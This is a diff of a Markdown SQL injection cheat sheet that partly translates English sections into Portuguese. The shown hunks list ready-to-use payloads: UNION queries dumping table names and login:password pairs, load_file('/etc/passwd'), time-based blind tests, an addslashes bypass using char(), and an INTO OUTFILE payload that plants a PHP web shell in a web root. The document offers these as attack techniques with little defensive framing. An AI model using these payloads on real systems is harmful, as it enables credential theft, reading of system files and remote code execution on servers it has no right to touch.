@@ -1,21 +1,21 @@
 # SQL Injection
-SQL Injection is a common security vulnerability in web applications that interact with databases. In this type of attack, an attacker intentionally inserts malicious SQL statements into a web form's input fields or URL parameters, exploiting flaws in data validation or sanitization. When these instructions are executed by the database, they can allow the attacker to manipulate system behavior, such as accessing, modifying, or deleting data, or even gain complete control over the server.
+Injeção de SQL é uma vulnerabilidade de segurança comum em aplicações web que interagem com bancos de dados. Nesse tipo de ataque, um invasor insere intencionalmente instruções SQL maliciosas nos campos de entrada ou parâmetros de URL de um formulário web, explorando falhas na validação ou sanitização de dados. Quando essas instruções são executadas pelo banco de dados, elas podem permitir que o invasor manipule o comportamento do sistema, como acessar, modificar ou excluir dados, ou até mesmo obter controle total sobre o servidor
 
 ## Information Schema
-Through the Information Schema, it is possible to obtain the table with system users and passwords and obtain the information contained in it.
+Através do Information Schema é possível obter a tabela com usuários e senhas do sistema e obter as informações nela contidas
 
-Exemple: ' union select 1,2, group_concat(table_name),4,5 from information_schema.tables where table_schema = "string" %23
+Exemplo: ' union select 1,2, group_concat(table_name),4,5 from information_schema.tables where table_schema = "string" %23
 
-Example: ' union select 1,2,concat(login,':',senha),4,5 from table %23
+Exemplo: ' union select 1,2,concat(login,':',senha),4,5 from table %23
 
 ## Error Based
-Error Based, as the name implies, is based on the error that returns when trying to make a query in the database in some field. With it, you can inject SQL code to discover information about the table and the database.
+Error Based, como o nome indica, baseia-se no erro que retorna ao tentar realizar uma consulta no banco de dados em algum campo. Com ele, você pode injetar código SQL para descobrir informações sobre a tabela e o banco de dados
 
-Example: ' union select 1,2,3... %23'
+Exemplo: ' union select 1,2,3... %23
 
-Example: ' order by 1 or 2 or 3...'
+Exemplo: ' order by 1 or 2 or 3...'
 
-Example: union select 1, column_name, load_file(”/etc/passwd”), 4, from information_schema.columns where table_schema=”database” and table_name=”users” %23
+Exemplo: union select 1, column_name, load_file(”/etc/passwd”), 4, 5 from information_schema.columns where table_schema=”database” and table_name=”users” %23
 
 ## Blind
 When there are no indications if there is a SQL Injection, some tests can be used to verify the AND and OR logic of the program.
@@ -45,11 +45,11 @@ Example: ' or if (database() = char(char(115,116,114,105,110,103)), sleep(5), 0)
 Example: ' or if (ascii(substring(database(), 1, 1)) = 100, sleep(5), 0)#
 
 ## SQLi to RCE
-With SQL command injection, you can write data to the server with the INTO OUTFILE command and the path of the directory you want to save.
+Com a injeção de comando SQL, você pode gravar dados no servidor com o comando INTO OUTFILE e o caminho do diretório que deseja salvar
 
-Example: ‘ union all select 1,2,3,4, “string” INTO OUTFILE “/var/www/html/website/file.txt” %23
+Exemplo: ‘ union all select 1,2,3,4, “string” INTO OUTFILE “/var/www/html/website/file.txt” %23
 
-Example: ‘ union all select 1,2,3,4, “`<?php system($_GET[’parameter’]); ?>” INTO OUTFILE “/var/www/html/website/banners/file.php” %23
+Exemplo: ‘ union all select 1,2,3,4, “`<?php system($_GET[’parameter’]); ?>” INTO OUTFILE “/var/www/html/website/banners/file.php” %23
 
 ## Bypass addslashes
 In some cases, because of the way it was programmed to be queried in the database, some backslashes will be added to the query, making it impossible to make queries with single quotes, generating an error. However, one of the ways to circumvent this mechanism is to pass string values in decimals separated by commas with the char() function.
